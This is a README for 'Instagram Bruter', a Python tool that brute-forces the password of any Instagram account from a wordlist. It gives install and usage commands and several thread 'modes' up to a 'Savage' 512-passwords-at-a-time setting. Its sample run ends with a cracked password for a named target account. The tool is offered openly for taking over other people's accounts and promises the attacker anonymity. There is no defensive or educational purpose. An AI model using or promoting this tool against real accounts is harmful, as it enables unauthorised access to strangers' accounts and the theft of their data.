# Instagram Bruter

[![Version](https://img.shields.io/badge/Version-v2.1.1-blue)]()
[![Python](https://img.shields.io/badge/Python-v3.6%2B-blue)]()
[![Discord](https://img.shields.io/badge/Discord-server-blue)](https://discord.gg/C6AFrWQ)
[![Donate](https://img.shields.io/badge/PayPal-donate-orange)](https://www.paypal.me/Msheikh03)

This program will brute force any Instagram account you send it its way. Just give it a target, a password list and a mode then press enter and forget about it. No need to worry about anonymity when using this program, its highest priority is your anonymity, it only attacks when your identity is hidden.

### NOTICE

I'm no longer maintaining this project.

### Support me

> **Bitcoin wallet:** 3Kr5C9t9HWwPfqzSNXeBNyRvJWw9sSLeKy<br> >**PayPal:** https://www.paypal.me/Msheikh03

### Requirements

-   Python _v3.x.x_
-   ~~Kali Linux 2.0~~
-   ~~TOR~~

### Install Dependencies

```
pip3 install -r requirements.txt
```

### Help

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py -h
usage: instagram.py [-h] [-m MODE] username wordlist

positional arguments:
  username              email or username
  wordlist              password list

optional arguments:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```

### Usage

```
python3 instagram.py <username> <wordlist> -m <mode>
```

### Bots(Threads)

-   4 bots: 64 passwords at a time
-   8 bots: 128 passwords at a time
-   16 bots: 256 passwords at a time
-   32 bots: 512 passwords at a time

### Modes

-   0: 32 bots
-   1: 16 bots
-   2: 8 bots
-   3: 4 bots

### Chill mode

This mode uses only 4 bots, or 64 passwords at a time.

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 3
```

### Moderate mode 1

This mode uses 8 bots, or 128 passwords at a time.

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 2
```

### Moderate mode 2

This mode uses 16 bots, or 256 passwords at a time.

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 1
```

### Savage mode

This mode uses 32 bots, or 512 passwords at a time.

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 0
```

### If you don't specify a mode, then mode is set to 2

### Run

```
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: 272
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Stop

```
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: Sami123
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: Sami09.1
[+] Password: Sami123
```
